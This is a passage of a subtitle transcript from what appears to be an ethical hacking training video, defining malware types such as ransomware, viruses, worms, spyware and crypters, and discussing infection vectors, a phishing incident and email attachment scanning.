gonna be full of malware.\n\n201\n00:10:01.130 --> 00:10:03.570\nAnd so you root the device or\njailbreak it, and\n\n202\n00:10:03.570 --> 00:10:06.170\ninadvertently you're loading\nup the remote access trojan\n\n203\n00:10:06.170 --> 00:10:09.020\nthat then essentially gives somebody\nthe right to take over your machine.\n\n204\n00:10:09.020 --> 00:10:10.910\nSo, you gotta be really\ncareful with this stuff.\n\n205\n00:10:10.910 --> 00:10:15.820\nRansomware, this is malicious software\ndesigned to block access to the computer.\n\n206\n00:10:15.820 --> 00:10:19.170\nOftentimes, it'll encrypt the drive,\nor threaten to anyway, and\n\n207\n00:10:19.170 --> 00:10:23.190\nextort money from the owner of\nthe system in order to then unlock it.\n\n208\n00:10:23.190 --> 00:10:26.530\nCryptoLocker, a pretty famous one\nthat's been around now for a few years.\n\n209\n00:10:26.530 --> 00:10:27.800\nYou often hear about it.\n\n210\n00:10:27.800 --> 00:10:28.970\nThere's a bunch of different one's.\n\n211\n00:10:28.970 --> 00:10:32.220\nThere's another one that's been real\nprevalent in Europe in the last few\n\n212\n00:10:32.220 --> 00:10:37.130\nmonths, beginning of 2016 into middle\nto late 2016 that's been running amok\n\n213\n00:10:37.130 --> 00:10:39.100\nthat they're talking about a lot as well.\n\n214\n00:10:39.100 --> 00:10:43.320\nYou know, it comes and goes, there's waves\nof this stuff and obviously this and\n\n215\n00:10:43.320 --> 00:10:47.000\nadware and in general just all\nthe nuisance ware that's out there.\n\n216\n00:10:47.000 --> 00:10:47.970\nCan be problematic.\n\n217\n00:10:47.970 --> 00:10:52.130\nBut like anything else, you get this stuff\nby going to places that you shouldn't be\n\n218\n00:10:52.130 --> 00:10:54.120\nand doing things you shouldn't be doing.\n\n219\n00:10:54.120 --> 00:10:55.880\nAnd one of the biggest challenges we have,\nand\n\n220\n00:10:55.880 --> 00:11:00.220\nwe talked about this a lot in other\nareas of our discussions both in CEH,\n\n221\n00:11:00.220 --> 00:11:03.230\nin the Certified Ethical Hacker,\ncontent we'd be going through.\n\n222\n00:11:03.230 --> 00:11:06.840\nBut also in a lot of the other\nprograms that either Mike and I or\n\n223\n00:11:06.840 --> 00:11:10.230\nwhoever I've been doing the programs\nwith around security have spoken about.\n\n224\n00:11:10.230 --> 00:11:14.410\nThe CISSP, the SSCP,\nthe cloud security, the CASP content.\n\n225\n00:11:14.410 --> 00:11:17.075\nWe put a lot of security stuff\ntogether for you guys, right?\n\n226\n00:11:17.075 --> 00:11:18.670\n&gt;&gt; [LAUGH]\n&gt;&gt; So all that kind of stuff that we've\n\n227\n00:11:18.670 --> 00:11:22.880\ndone almost in every one of those shows\nsomewhere, we've spoken about the fact\n\n228\n00:11:22.880 --> 00:11:26.550\nthat security awareness and training\n&gt;&gt; Is so fundamentally important for\n\n229\n00:11:26.550 --> 00:11:30.450\nyour end users to help them better\nunderstand the things they should,\n\n230\n00:11:30.450 --> 00:11:34.200\ncould and should and would not do\nbecause it's very important for\n\n231\n00:11:34.200 --> 00:11:38.450\nus as security professionals to think\nabout the fact that while we have to be on\n\n232\n00:11:38.450 --> 00:11:42.480\nguard, while we have to know how to do all\nthe things we have to do to protect out\n\n233\n00:11:42.480 --> 00:11:45.930\nsystems, at the end of the day we put\na lot of trust and faith in end users\n\n234\n00:11:45.930 --> 00:11:47.980\nbecause we're not there all the time\n&gt;&gt; And\n\n235\n00:11:47.980 --> 00:11:51.710\nif they're doing things inadvertently,\ncuz we wanna obviously be fair.\n\n236\n00:11:51.710 --> 00:11:55.790\nWe know that there are certain segment of\nthe population that may get up to no good\n\n237\n00:11:55.790 --> 00:11:56.440\non purpose.\n\n238\n00:11:56.440 --> 00:11:59.020\nAnd that's just, unfortunately,\nthe way things are.\n\n239\n00:11:59.020 --> 00:12:02.610\nBut more often than not, it's the people\nthat are out there just doing their jobs,\n\n240\n00:12:02.610 --> 00:12:05.810\nnot looking to do harm per say,\nbut getting up to no good,\n\n241\n00:12:05.810 --> 00:12:08.730\nnot because they are purposely bad acting,\nbut\n\n242\n00:12:08.730 --> 00:12:13.440\nrather because inadvertently find\nthemselves in some sort of situation where\n\n243\n00:12:13.440 --> 00:12:17.010\nthey have access to material\nthat on the surface seems good.\n\n244\n00:12:17.010 --> 00:12:19.810\nAnd they want to download it or\nwhatever the case may be.\n\n245\n00:12:19.810 --> 00:12:23.230\nBut clearly there's malware or something\nlurking underneath the hood there.\n\n246\n00:12:23.230 --> 00:12:24.580\nAnd that's the challenge, right?\n\n247\n00:12:24.580 --> 00:12:28.860\nBecause if we can educate users that\nthings are typically too good to be true.\n\n248\n00:12:28.860 --> 00:12:32.240\nThat there is no such thing as free\nsoftware that you don't pay for, but\n\n249\n00:12:32.240 --> 00:12:34.200\ndoes all thing the license stuff does.\n\n250\n00:12:34.200 --> 00:12:36.770\nAt least not without it being coming,\nright?\n\n251\n00:12:36.770 --> 00:12:38.520\nWith other stuff and being compromised.\n\n252\n00:12:38.520 --> 00:12:42.510\nYeah, I'm sure you can find pirated copies\nof Office and everything else out there.\n\n253\n00:12:42.510 --> 00:12:43.920\nI don't doubt that you can.\n\n254\n00:12:43.920 --> 00:12:45.720\nAt least I've been told\nthat that's the case.\n\n255\n00:12:45.720 --> 00:12:48.660\nI wouldn't know about that,\nbecause I'm not that kind of person.\n\n256\n00:12:48.660 --> 00:12:50.870\nI mean look at me,\nI look honest and I look loveable.\n\n257\n00:12:50.870 --> 00:12:52.585\nHow would you possible\nthink that would be me?\n\n258\n00:12:52.585 --> 00:12:56.390\nRight?\nBut the reality is that we all know\n\n259\n00:12:56.390 --> 00:13:01.560\nthat there are versions of all sorts\nof stuff out there that, if accessed by\n\n260\n00:13:01.560 --> 00:13:06.940\na bad actor, can actually be modified, put\nback out there for use by an individual.\n\n261\n00:13:06.940 --> 00:13:09.460\nAnd if they're downloaded,\nall sorts of things can happen.\n\n262\n00:13:09.460 --> 00:13:10.760\nSo we have to keep that in mind.\n\n263\n00:13:10.760 --> 00:13:12.050\nWe have to be aware of that.\n\n264\n00:13:12.050 --> 00:13:15.170\nHave to understand that these\nare considerations, right?\n\n265\n00:13:15.170 --> 00:13:18.060\nThat we will wanna make sure\nwe are taking into account.\n\n266\n00:13:18.060 --> 00:13:19.550\nAll right, so we have ransomware.\n\n267\n00:13:19.550 --> 00:13:20.680\nWe have adware.\n\n268\n00:13:20.680 --> 00:13:23.990\nAdware is the stuff that you see\npopping up all the time, Right?\n\n269\n00:13:23.990 --> 00:13:26.620\nHow many versions of Viagra ads.\n\n270\n00:13:26.620 --> 00:13:28.880\nAnd how many versions of who knows what,\n\n271\n00:13:28.880 --> 00:13:32.030\nthat you get out there about things\nthat they want you to click on.\n\n272\n00:13:32.030 --> 00:13:34.500\nDownload this PC Reg cleaner.\n\n273\n00:13:34.500 --> 00:13:35.805\nDownload PC Fix.\n\n274\n00:13:35.805 --> 00:13:37.200\nOr whatever the case may be.\n\n275\n00:13:37.200 --> 00:13:41.730\nAnd when you do all that stuff, that's\ngoing to be the problem right there.\n\n276\n00:13:41.730 --> 00:13:47.010\nIs the fact that, ultimately,\nyou are going to be infecting your system.\n\n277\n00:13:47.010 --> 00:13:50.320\nBut also probably getting something that\nyou think you may or may not want, but\n\n278\n00:13:50.320 --> 00:13:52.480\nyou definitely don't want\nwhat you get is part of that.\n\n279\n00:13:52.480 --> 00:13:56.450\nI actually had an issue this week at work,\nwhere we had a problem,\n\n280\n00:13:56.450 --> 00:14:00.220\nsomebody had clicked on, you get one\nof this innocent looking boxes, hey,\n\n281\n00:14:00.220 --> 00:14:01.580\nit's time to reset your password.\n\n282\n00:14:01.580 --> 00:14:02.970\nNo matter how many time you tell people,\n\n283\n00:14:02.970 --> 00:14:05.140\nno matter how many times you educate them,\nright?\n\n284\n00:14:05.140 --> 00:14:07.860\nI'm constantly telling our users,\nhey don't,\n\n285\n00:14:07.860 --> 00:14:11.580\nif it looks like anything that has\nto do with resetting something,\n\n286\n00:14:11.580 --> 00:14:15.990\nif it's an admin issue, if we want,\nwe as IT, we as security.\n\n287\n00:14:15.990 --> 00:14:19.540\nIf we want you to do that, trust me,\nwe'll be in touch with you.\n\n288\n00:14:19.540 --> 00:14:23.000\nIt's not gonna be a random pop up on\nyour machine that comes out of nowhere,\n\n289\n00:14:23.000 --> 00:14:27.370\nthat essentially just says, hey by the way\ncould you click right here in this box,\n\n290\n00:14:27.370 --> 00:14:31.470\nright, and just put everything you\nhave that you know in the box.\n\n291\n00:14:31.470 --> 00:14:34.890\nAnd so one of our users clicked on it,\nreset their password.\n\n292\n00:14:34.890 --> 00:14:39.820\nInnocently thinking that was the case and\nI literally spent the last three or\n\n293\n00:14:39.820 --> 00:14:44.340\nfour days walking through\nissues around that because\n\n294\n00:14:44.340 --> 00:14:49.100\nbank accounts were accessed,\nfraudulent transactions were attempted.\n\n295\n00:14:50.150 --> 00:14:54.010\nWe still have issues in the systems\nbecause we feel there's probably been\n\n296\n00:14:54.010 --> 00:14:56.670\nmalware inserted into the computer\nthat we now have to go in and\n\n297\n00:14:56.670 --> 00:14:58.030\nultimately get rid of.\n\n298\n00:14:58.030 --> 00:15:02.200\nAnd this can be a major problem,\nand this is incredibly disruptive.\n\n299\n00:15:02.200 --> 00:15:05.620\nThis is the kind of thing where,\nif left unchecked and you don't realize,\n\n300\n00:15:05.620 --> 00:15:07.248\nall sorts of havoc can ensue.\n\n301\n00:15:07.248 --> 00:15:11.070\nSo you gotta be really careful,\nas a general standing rule of thumb.\n\n302\n00:15:11.070 --> 00:15:12.870\nAs a certified ethical hacker.\n\n303\n00:15:12.870 --> 00:15:16.749\nRemember we're training you ultimately,\nto figure out how to be on the offensive,\n\n304\n00:15:16.749 --> 00:15:19.450\ntrying to figure out what\nthe bad actors are doing.\n\n305\n00:15:19.450 --> 00:15:23.660\nEither learn they're methodologies, if you\nwill, so you can stand toe to toe with\n\n306\n00:15:23.660 --> 00:15:28.620\nthem and or bring that knowledge into\nthe business, into the organization,\n\n307\n00:15:28.620 --> 00:15:32.190\ninto the enterprise to provide\nguidance as a security professional so\n\n308\n00:15:32.190 --> 00:15:35.490\nyou are better armed,\nbetter protected against these attacks.\n\n309\n00:15:35.490 --> 00:15:38.990\nWhether or not you choose to use this\nknowledge in those ways is up to you, but\n\n310\n00:15:38.990 --> 00:15:42.440\nI'll remind you as we have at several\npoints during our conversations\n\n311\n00:15:42.440 --> 00:15:43.930\nin these episodes.\n\n312\n00:15:43.930 --> 00:15:48.569\nThis is knowledge that is not, not to be\nused offensively for you to go out and\n\n313\n00:15:48.569 --> 00:15:50.542\nstart hacking others, right?\n\n314\n00:15:50.542 --> 00:15:54.223\nIt's very important for you to understand\nthat at all times we act ethically,\n\n315\n00:15:54.223 --> 00:15:55.070\nwe act honestly.\n\n316\n00:15:55.070 --> 00:15:57.357\nWe act with the best intentions for\nour users.\n\n317\n00:15:57.357 --> 00:16:02.025\nAnd the organizations that we have\nat heart and we focus on that.\n\n318\n00:16:02.025 --> 00:16:04.940\nIt's good to understand\nhow bad an actress act.\n\n319\n00:16:04.940 --> 00:16:09.930\nYou have to be prepared to defend but you\ndon't go out and purposely attack others.\n\n320\n00:16:09.930 --> 00:16:14.380\nThere's nothing ethically wrong\nwith setting up a test environment,\n\n321\n00:16:14.380 --> 00:16:18.010\nhoning your skills,\nsome sort of cyber range activities.\n\n322\n00:16:18.010 --> 00:16:20.500\nThere's lots of things you\ncan do today to do that.\n\n323\n00:16:20.500 --> 00:16:22.020\nAnd that's perfectly fine.\n\n324\n00:16:22.020 --> 00:16:23.910\nBut you never take this information and\n\n325\n00:16:23.910 --> 00:16:28.580\ngo after somebody in a live event\neven if it's retaliatory in nature.\n\n326\n00:16:28.580 --> 00:16:32.280\nYou don't retaliate against people who\nare hacking you using this knowledge.\n\n327\n00:16:32.280 --> 00:16:34.190\nThat's not what we train you to do.\n\n328\n00:16:34.190 --> 00:16:36.740\nYou have to stop the attack and\npart of stopping it\n\n329\n00:16:36.740 --> 00:16:41.350\nmay be that you have to reprogram routers,\nyou may have to drop inbound connections.\n\n330\n00:16:41.350 --> 00:16:44.618\nBut you never go and actually attack\nthe person that attacked you and\n\n331\n00:16:44.618 --> 00:16:48.404\nit's an important distinction because\nthis is ethical hacking, right, and\n\n332\n00:16:48.404 --> 00:16:52.189\nit's important to understand that ethical\nhacking implies that we never go on\n\n333\n00:16:52.189 --> 00:16:55.745\nthe offensive, but rather we use our\nknowledge defensively to protect,\n\n334\n00:16:55.745 --> 00:16:57.614\nas opposed to offensively to attack.\n\n335\n00:16:57.614 --> 00:17:00.100\nSo just keep that in mind as we're\ntalking through our definitions.\n\n336\n00:17:00.100 --> 00:17:01.540\nSo we talked about adware.\n\n337\n00:17:01.540 --> 00:17:03.330\nWe've got a whole other list or\n\n338\n00:17:03.330 --> 00:17:05.840\nanother column of definitions there\nwe want continue going through.\n\n339\n00:17:05.840 --> 00:17:07.460\nI think virus is the next one up.\n\n340\n00:17:07.460 --> 00:17:08.920\nSo we talk about viruses and worms.\n\n341\n00:17:08.920 --> 00:17:11.930\nI asked Mike a little bit earlier,\nhey, what would be the distinguishing\n\n342\n00:17:11.930 --> 00:17:15.660\ncharacteristic or the definition\ncriteria between the two and\n\n343\n00:17:15.660 --> 00:17:20.370\nMike homed in on the exact thing,\nessentially the mechanism of transmission.\n\n344\n00:17:20.370 --> 00:17:21.550\nAnd a virus as you can see,\n\n345\n00:17:21.550 --> 00:17:24.580\npiece of code that's capable of copying or\nreplicating itself.\n\n346\n00:17:24.580 --> 00:17:29.290\nObviously usually detrimental in nature,\ncorrupts a system, does something to it.\n\n347\n00:17:29.290 --> 00:17:34.300\nBut a virus is what often refer to as\nbeing able to go ahead and will go\n\n348\n00:17:36.220 --> 00:17:40.080\nthrough and while it can make a copy of\nitself we don't distinguish there and\n\n349\n00:17:40.080 --> 00:17:42.840\nI should probably have\nbeen a little bit clearer.\n\n350\n00:17:42.840 --> 00:17:46.690\nWe wanna put in that it's\nable to copy itself but\n\n351\n00:17:46.690 --> 00:17:49.850\nit's not able to spread, right,\nunless we actually give it help.\n\n352\n00:17:49.850 --> 00:17:52.580\nBecause a lot of viruses\ncan replicate their code.\n\n353\n00:17:52.580 --> 00:17:55.590\nWe talk about polymorphic viruses,\nmetamorphic viruses.\n\n354\n00:17:55.590 --> 00:17:58.270\nThey can reinvent themselves on the fly.\n\n355\n00:17:58.270 --> 00:18:02.200\nBut, it doesn't actually spread\nunless we infect something else.\n\n356\n00:18:02.200 --> 00:18:06.360\nA file, a thumb drive, something like\nthat, and we share it with somebody else,\n\n357\n00:18:06.360 --> 00:18:08.940\nor send it through an email,\nor whatever the case may be.\n\n358\n00:18:08.940 --> 00:18:14.110\nSo a virus, will be a piece of code that\nwill need help to spread, whereas a worm\n\n359\n00:18:14.110 --> 00:18:18.350\nis going to be a standalone piece of\nmalware that can replicate itself and\n\n360\n00:18:18.350 --> 00:18:20.570\ncan spread to other\ncomputers without any help.\n\n361\n00:18:20.570 --> 00:18:21.365\nWorms, in other words,\n\n362\n00:18:21.365 --> 00:18:25.650\nself-replicate, whereas viruses\nneed help to actually spread.\n\n363\n00:18:25.650 --> 00:18:28.550\nSo, we'll just be a little bit clearer\non the definition there, Michael.\n\n364\n00:18:28.550 --> 00:18:31.050\nClean that up for us that's what\nhappens when you put them together.\n\n365\n00:18:31.050 --> 00:18:35.130\nTwo o'clock in the morning after you drive\nbefore you get ready to come to work and\n\n366\n00:18:35.130 --> 00:18:37.130\nshoot your first session for the day.\n\n367\n00:18:37.130 --> 00:18:41.490\nWe'll clean that up real quick and\nI apologize for the confusion there.\n\n368\n00:18:41.490 --> 00:18:45.570\nSpyware just moving down the list\nif you're done fixing that up.\n\n369\n00:18:45.570 --> 00:18:50.510\nSo spyware is, again, another\nversion of the adware, the backdoor,\n\n370\n00:18:50.510 --> 00:18:52.410\nthe Trojan horse, the ransomware.\n\n371\n00:18:52.410 --> 00:18:56.240\nThis is the stuff that enables\nus to obtain covert information.\n\n372\n00:18:56.240 --> 00:19:00.540\nWe infect the system, maybe with a remote\naccess Trojan or something like that.\n\n373\n00:19:00.540 --> 00:19:04.600\nWe can listen key loggers often\nare classified under spyware.\n\n374\n00:19:04.600 --> 00:19:07.710\nWhere we can gather information\nabout somebody sitting and\n\n375\n00:19:07.710 --> 00:19:12.530\nlooking at what you're doing and gather\nthat information through screen scraping.\n\n376\n00:19:12.530 --> 00:19:14.630\nThere's all these different\nways to do do that.\n\n377\n00:19:14.630 --> 00:19:18.060\nI mention bots and bot nets and\nzombie and zombie nets earlier.\n\n378\n00:19:18.060 --> 00:19:20.630\nA bot is just simply a machine\nthat's been infected with one or\n\n379\n00:19:20.630 --> 00:19:21.950\nmore pieces of malware.\n\n380\n00:19:21.950 --> 00:19:25.310\nA zombie's just a newer updated\nthought process along the same lines.\n\n381\n00:19:25.310 --> 00:19:29.064\nAnd a botnet is the group of machines that\nwe link together with the command and\n\n382\n00:19:29.064 --> 00:19:31.086\ncontrol infrastructure to then go out and\n\n383\n00:19:31.086 --> 00:19:34.289\nexecute distributed denial of\nservice attacks, DDOS attacks.\n\n384\n00:19:34.289 --> 00:19:38.310\nAnd zombie nets or zombie networks\nare essentially the same thing.\n\n385\n00:19:38.310 --> 00:19:40.460\nAnd then crypters down\nat the bottom there.\n\n386\n00:19:41.610 --> 00:19:44.550\nNot critters, but crypters,\njust in case you were wondering.\n\n387\n00:19:44.550 --> 00:19:46.210\nIt's a software tool,\nas you can see there,\n\n388\n00:19:46.210 --> 00:19:48.910\nthat have combination of\ndifferent things going on.\n\n389\n00:19:48.910 --> 00:19:51.500\nThey'll use encryption,\ntypically, obfuscation, and\n\n390\n00:19:51.500 --> 00:19:54.720\ncode manipulation to make\nthemselves undetectable.\n\n391\n00:19:54.720 --> 00:19:58.270\nCrypter is kind of a short hand term for\nsoftware that often will encrypt or\n\n392\n00:19:58.270 --> 00:20:02.050\nmorph itself and burrow deep so\na lot of root kits that\n\n393\n00:20:02.050 --> 00:20:06.860\nhave crypter capabilities\nare classified dually in both of these\n\n394\n00:20:06.860 --> 00:20:10.590\nareas because root kits will often be very\ndifficult to detect as we talked about.\n\n395\n00:20:10.590 --> 00:20:13.180\nSo sometimes you'll here them\nreferred to as crypters.\n\n396\n00:20:13.180 --> 00:20:16.960\nBut this is essentially software\nthat burrows in, hides itself so\n\n397\n00:20:16.960 --> 00:20:19.700\nthat you don't know what it is and\nwhat's going on, and\n\n398\n00:20:19.700 --> 00:20:23.220\nthen is very difficult to detect as\na result of that so we just want to make\n\n399\n00:20:23.220 --> 00:20:26.850\nsure we're thinking about all those and\nobviously have a sense of that.\n\n400\n00:20:26.850 --> 00:20:30.670\nWhat are some ways that we can\nactually see a machine getting that?\n\n401\n00:20:30.670 --> 00:20:32.110\nWe've talked about several ways, right?\n\n402\n00:20:32.110 --> 00:20:36.300\nGoing out on the net, downloading things\nor interacting with things that you may or\n\n403\n00:20:36.300 --> 00:20:40.370\nmay not belong doing, instant messaging\nalthough it's not as prevalent\n\n404\n00:20:40.370 --> 00:20:45.610\nas it used to be but IRC chat networks\nare still a huge reservoir for this stuff.\n\n405\n00:20:45.610 --> 00:20:50.880\nAnd I looked up some stats\nrecently on IRC, an article or\n\n406\n00:20:50.880 --> 00:20:54.730\nsomething I was writing and I had to have\nsome numbers on how prevalent it still is.\n\n407\n00:20:55.910 --> 00:20:56.910\nThere's on average, and\n\n408\n00:20:56.910 --> 00:20:59.470\nthis is a very small number when you think\nabout the number of people that are active\n\n409\n00:20:59.470 --> 00:21:03.470\nin communities today on the net but\nabout 50 to 60,000 people\n\n410\n00:21:03.470 --> 00:21:07.520\non some of the largest IRC chat numbers\ncurrently at any one time which for\n\n411\n00:21:07.520 --> 00:21:09.990\nthat kind of a network is a lot of people.\n\n412\n00:21:09.990 --> 00:21:14.390\nThis is still primarily the purview or\nthe area that is\n\n413\n00:21:14.390 --> 00:21:19.220\nyou really considered to be education so\na lot of the chat rooms and things like\n\n414\n00:21:19.220 --> 00:21:24.430\nthat used by various professors and\nvarious educational institutions.\n\n415\n00:21:24.430 --> 00:21:27.966\nYou have lots of hackers that\nare hiding there in plain sight,\n\n416\n00:21:27.966 --> 00:21:32.114\ncommunicating on those forums,\nexchanging malware kind of as cover for\n\n417\n00:21:32.114 --> 00:21:36.880\nvarious things, so instant messenger\napplications, IRC, removable devices.\n\n418\n00:21:36.880 --> 00:21:39.560\nWe often talk about the fact\nthat you put a thumb drive in or\n\n419\n00:21:39.560 --> 00:21:41.520\nsomething like that,\nyou never know what's on it.\n\n420\n00:21:41.520 --> 00:21:43.490\nI have students doing that\nall the time in class.\n\n421\n00:21:43.490 --> 00:21:46.010\nHey, can you throw that file on there for\nme and\n\n422\n00:21:46.010 --> 00:21:50.230\nI'll give you a drive and I tell them,\nhey, I have no trouble doing that, but\n\n423\n00:21:50.230 --> 00:21:55.610\nunderstand, I have a lot of stuff\nrunning on my machine at all times.\n\n424\n00:21:55.610 --> 00:21:57.850\nAnd you never know what's\ngonna wind up on that drive.\n\n425\n00:21:57.850 --> 00:22:00.800\nAre you sure you wanna\nplay Russian Roulette?\n\n426\n00:22:00.800 --> 00:22:03.250\nAnd you never know what\nyou're gonna get back.\n\n427\n00:22:03.250 --> 00:22:05.920\nAnd sometimes it's a goodie,\nand sometimes it's a baddie.\n\n428\n00:22:05.920 --> 00:22:08.000\nAnd that's Just the way it works right?\n\n429\n00:22:08.000 --> 00:22:10.580\nSo attachments obviously\nvery important as well.\n\n430\n00:22:10.580 --> 00:22:14.780\nOne of the things that's been interesting\nyou and I were chatting a little before we\n\n431\n00:22:14.780 --> 00:22:19.407\ncame on this morning about Exchange, I was\ntelling you about the Exchange 2016 stuff.\n\n432\n00:22:19.407 --> 00:22:23.207\nAnd so the continuing evolution of DLP,\ndata loss prevention, and\n\n433\n00:22:23.207 --> 00:22:28.074\nDpacket inspection technology in these\nplatforms messaging platforms, enterprise\n\n434\n00:22:28.074 --> 00:22:32.290\ncontent management, SharePoint, Web Sphere\n&gt;&gt; Document them,\n\n435\n00:22:32.290 --> 00:22:37.250\nprograms like this that are online\nfiling cabinets essentially today.\n\n436\n00:22:37.250 --> 00:22:40.290\nI was doing some work for\na customer recently and we were setting up\n\n437\n00:22:40.290 --> 00:22:44.960\nan architecture building, a solution for\nthem and one of the key issues,\n\n438\n00:22:44.960 --> 00:22:48.840\nthe key concern was, how are we\ngonna handle this kind of issue?\n\n439\n00:22:48.840 --> 00:22:52.740\nHow do we handle attachments that\nare getting either malware in them or\n\n440\n00:22:52.740 --> 00:22:56.450\nviruses coming in,\nwhat are the key concepts?\n\n441\n00:22:56.450 --> 00:23:00.590\nWell, obviously, clearly inline scanning\nis real important as a stand off.\n\n442\n00:23:00.590 --> 00:23:03.620\nWhether it's an Edge,\nSMTP gateway of some kind so\n\n443\n00:23:03.620 --> 00:23:07.906\nthe edge transports, let's say, in\nExchange or whatever your SMTP gateway is.\n\n444\n00:23:07.906 --> 00:23:12.990\nCloud-based Postini or something like that\ntoday, using spam confidence filtering,\n\n445\n00:23:12.990 --> 00:23:16.520\nso the spam confidence level,\nthe center protection framework,\n\n446\n00:23:16.520 --> 00:23:18.150\nall the stuff we do with email.\n\n447\n00:23:18.150 --> 00:23:23.130\nAnd then, doing multiple overlapping\nlayers of scanning that you step back into\n\n448\n00:23:23.130 --> 00:23:24.220\nthe environment.\n\n449\n00:23:24.220 --> 00:23:28.230\nBut the key thing there that's really\nbecoming huge today is off loading and\n\n450\n00:23:28.230 --> 00:23:32.710\ndoing inline real time encryption and\ndecryption on the platform\n\n451\n00:23:32.710 --> 00:23:37.580\nby loading the encryption keys, the SSL or\nTLS keys into these gateways and\n\n452\n00:23:37.580 --> 00:23:40.930\nthen having them done inline, so\nyou can scan these attachments.\n\n453\n00:23:40.930 --> 00:23:43.210\nBecause the problem is when\nthese attachments come in,\n\n454\n00:23:43.210 --> 00:23:47.650\nbecause we're not dumb, as attackers we\nknow if it's encrypted, you can't scan it,\n\n455\n00:23:47.650 --> 00:23:48.620\nunless you decrypt it.\n\n456\n00:23:48.620 --> 00:23:51.919\nAnd so if you don't have the encryption\ndecryption capability on the platform,\n\n457\n00:23:51.919 --> 00:23:53.529\nyou can't look at these attachments.\n\n458\n00:23:53.529 --> 00:23:55.867\nEither you allow them in,\nor you simply drop them.\n\n459\n00:23:55.867 --> 00:23:59.512\nAnd a lot of times, they're allowed in,\nbecause we can't wholesale drop stuff,\n\n460\n00:23:59.512 --> 00:24:00.553\nbecause we know that For\n\n461\n00:24:00.553 --> 00:24:04.005\neverything that's bad that comes in\nthere's a lot of good stuff that we need.\n\n462\n00:24:04.005 --> 00:24:07.029\nAnd so one of the big moves today\nis that we're doing more and\n\n463\n00:24:07.029 --> 00:24:11.086\nmore of this where we're actually doing\ninline decryption, which is great but\n\n464\n00:24:11.086 --> 00:24:15.162\nit also urban myth and legend being what\nit is, it does tend to slow things down.\n\n465\n00:24:15.162 --> 00:24:18.000\nWe have to offset for that and\nwe can control for that.\n\n466\n00:24:18.000 --> 00:24:20.150\nBut one of the big issues\nnow is not okay so\n\n467\n00:24:20.150 --> 00:24:23.400\nwe're secreting malware through\nthe system, we can figure that out.\n\n468\n00:24:23.400 --> 00:24:27.380\nThe big issue now, quite honestly,\nis now how do we protect the keys, right?\n\n469\n00:24:27.380 --> 00:24:29.160\nAnd how do we get good at key management?\n\n470\n00:24:29.160 --> 00:24:32.394\nAnd this is another issue that we've\nspoken about in some of the other episodes\n\n471\n00:24:32.394 --> 00:24:34.014\nand we'll talk about in various ways.\n\n472\n00:24:34.014 --> 00:24:37.505\nWe've mentioned PKI, and certificates,\nand all that kind of stuff.\n\n473\n00:24:37.505 --> 00:24:40.845\nBut if you're not spot on with key\nmanagement, and you're loading these keys\n\n474\n00:24:40.845 --> 00:24:45.235\ninto a device, either with a TPM,\na trusted platform module, or an HSM,\n\n475\n00:24:45.235 --> 00:24:49.652\na hardware security module,\nan external bolt-on TPM essentially.\n\n476\n00:24:49.652 --> 00:24:52.453\nIf you're doing this, and you're in\na multi-tenant cloud environment,\n\n477\n00:24:52.453 --> 00:24:54.686\nyou don't know who's walking\naround in that environment,\n\n478\n00:24:54.686 --> 00:24:56.584\nyou don't know how to\ncontrol physical security.\n\n479\n00:24:56.584 --> 00:24:59.502\nThere's all these ripple effects,\nright, that come through,\n\n480\n00:24:59.502 --> 00:25:01.421\nthat we don't often stop and think about.\n\n481\n00:25:01.421 --> 00:25:04.291\nJust by talking about something like\nhow do we scan for attachments,\n\n482\n00:25:04.291 --> 00:25:05.491\nhow do we know if there's malware there?\n\n483\n00:25:05.491 --> 00:25:07.111\nWell, we can deal with that but\n\n484\n00:25:07.111 --> 00:25:09.691\nnow the problem is how do we\npush that protected boundary,\n\n485\n00:25:09.691 --> 00:25:13.820\nthe security perimeter, out three or\nfour layers in our defensive architecture?\n\n486\n00:25:13.820 --> 00:25:18.150\nAnd still ultimately maintain\ncontrol of this at every level, and\n\n487\n00:25:18.150 --> 00:25:19.440\nit becomes very challenging.\n\n488\n00:25:19.440 --> 00:25:23.690\nAs an architect for me, for Mike, for\nany of us that do this professionally, for\n\n489\n00:25:23.690 --> 00:25:26.120\nany of you obviously that\nare doing this as well, or\n\n490\n00:25:26.120 --> 00:25:28.870\nlearning how to do it, and\nthinking about the issues and\n\n491\n00:25:28.870 --> 00:25:32.170\nthe concerns, this is one of\nthe key challenges we have today.\n\n492\n00:25:32.170 --> 00:25:35.797\nBrowser and email, software bugs,\ntoday SSL-based VPNs.\n\n493\n00:25:35.797 --> 00:25:38.577\nEverything's going through\na web API in the browser.\n\n494\n00:25:38.577 --> 00:25:42.467\nAnd I had this conversation with\none of my customers lately,\n\n495\n00:25:42.467 --> 00:25:45.220\nwe were working on a,\nwhat the heck was it?\n\n496\n00:25:45.220 --> 00:25:47.271\nI think it was,\nyeah I was doing actually yeah.\n\n497\n00:25:47.271 --> 00:25:51.460\nSo I was doing a security solution for\nthem without going into a lot of detail.\n\n498\n00:25:51.460 --> 00:25:54.244\nAnd we were working on\nan architectural issue, and\n\n499\n00:25:54.244 --> 00:25:58.207\nwe were talking about the fact that\nthey use currently a agent based VPN.\n\n500\n00:25:58.207 --> 00:26:02.500\nAnd they recently moved to Palo Alto, so\nthey're using Palo Alto based solutions on\n\n501\n00:26:02.500 --> 00:26:05.528\nthe firewall and all that,\nand guy loves it, it's great.\n\n502\n00:26:05.528 --> 00:26:09.119\nWe were talking about different options,\nand so we talked about SSL-based VPNs.\n\n503\n00:26:09.119 --> 00:26:10.345\nBut the challenge for\n\n504\n00:26:10.345 --> 00:26:14.600\nhim was the issue is now we're\npushing everything through the web.\n\n505\n00:26:14.600 --> 00:26:17.900\nIt's SSL based,\nwhich we know is not as good as TLS,\n\n506\n00:26:17.900 --> 00:26:19.760\nsince we're having challenges with that.\n\n507\n00:26:19.760 --> 00:26:24.200\nPlus the fact that ultimately,\nthere's a lot of possibility for\n\n508\n00:26:24.200 --> 00:26:25.460\npeople to get this wrong.\n\n509\n00:26:25.460 --> 00:26:29.006\nBecause if they're not paying attention,\nif there's a key logger on the system,\n\n510\n00:26:29.006 --> 00:26:32.270\nit'll run regardless of the agent,\nagentless based environment.\n\n511\n00:26:32.270 --> 00:26:37.140\nBut just the concern about\nusing these APIs that are,\n\n512\n00:26:37.140 --> 00:26:40.390\nessentially, really unknown to us and\nthe fact that we just don't know what's\n\n513\n00:26:40.390 --> 00:26:43.580\nhappening in that traffic flow is\ncausing a lot of people concerns.\n\n514\n00:26:43.580 --> 00:26:44.496\nBut we're seeing more and\n\n515\n00:26:44.496 --> 00:26:47.330\nmore of this traffic being pushed through\nweb interfaces cuz of the cloud today.\n\n516\n00:26:47.330 --> 